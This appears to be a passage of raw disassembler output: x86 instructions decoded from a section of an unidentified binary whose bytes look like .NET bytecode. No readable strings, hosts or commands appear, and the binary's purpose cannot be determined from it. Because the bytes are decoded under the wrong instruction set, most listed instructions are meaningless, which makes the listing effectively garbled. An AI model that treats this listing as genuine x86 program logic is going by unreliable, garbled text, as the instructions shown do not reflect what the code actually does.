  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 e2             	es jb  0x4036b4
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	f4                   	hlt
  40372d:	23 00                	and    (%eax),%eax
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 5e 21 00       	and    $0x215e72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 fa                	jb     0x403774
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 10 24 00       	and    $0x241072,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 1a 24 00       	and    $0x241a72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 24 24 00       	and    $0x242472,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 2a                	jb     0x4037f7
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 3e             	or     0x3e(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	42                   	inc    %edx
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	4c                   	dec    %esp
  4037ef:	24 00                	and    $0x0,%al
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 58             	or     0x58(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	64 24 00             	fs and $0x0,%al
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 70 24 00       	and    $0x247072,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 7a 24 00       	and    $0x247a72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 8a 24 00       	and    $0x248a72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 96             	or     -0x6a(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	8a 24 00             	mov    (%eax,%eax,1),%ah
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 a0             	or     -0x60(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	1a 24 00             	sbb    (%eax,%eax,1),%ah
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 ac 24 00       	and    $0x24ac72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 c4 24 00       	and    $0x24c472,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 d6 24 00       	and    $0x24d672,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 ea 24 00       	and    $0x24ea72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 fe 24 00       	and    $0x24fe72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 58                	jb     0x40394d
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 08 25 00       	and    $0x250872,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 14             	adc    %esi,0x14(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 1a             	or     0x1a(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 46             	or     0x46(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 84    	or     0x84720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 9c                	jb     0x4039b2
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 a4             	add    %dh,-0x5c(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 9c                	jb     0x4039e3
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 58             	add    %dh,0x58(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
